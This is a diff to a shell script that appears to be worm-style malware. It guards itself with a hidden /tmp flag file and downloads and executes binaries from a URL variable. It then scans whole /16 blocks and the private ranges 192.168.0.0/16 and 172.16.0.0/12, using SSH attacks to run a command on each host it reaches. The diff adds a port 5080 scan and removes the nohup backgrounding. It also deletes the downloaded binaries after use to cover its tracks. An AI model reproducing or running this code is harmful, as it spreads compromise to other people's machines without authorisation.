@@ -4,7 +4,7 @@ flagfile="/tmp/.sjyir.temp"
 if [ -f "$flagfile" ]; then
     exit 0
 fi
-
+touch "$flagfile" 2>/dev/null || : > "$flagfile"
 
 download_file() {
     url="$1"
@@ -78,7 +78,8 @@ if download_file "$DOWNLOAD_URL" "$LOCAL_NAME"; then
     chmod +x "$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    nohup "$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD" >/dev/null 2>&1 &
+    "$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD"
+    "$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD" -p 5080
 done
 rm -rf "$LOCAL_NAME"
 
@@ -90,11 +91,9 @@ if download_file "$furl" "$LOCAL_NAME"; then
     chmod +x "$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    nohup "$LOCAL_NAME" -h "$b.0.0/16" -c "$CMD" -m ssh -np -no >/dev/null 2>&1 &
+    "$LOCAL_NAME" -h "$b.0.0/16" -c "$CMD" -m ssh -np -no
 done
-nohup "$LOCAL_NAME" -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no >/dev/null 2>&1 &
-nohup "$LOCAL_NAME" -h 172.16.0.1/12 -c "$CMD" -m ssh -no >/dev/null 2>&1 &
+"$LOCAL_NAME" -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no
+"$LOCAL_NAME" -h 172.16.0.1/12 -c "$CMD" -m ssh -no
 rm -rf "$LOCAL_NAME"
 
-
-touch "$flagfile" 2>/dev/null || : > "$flagfile"
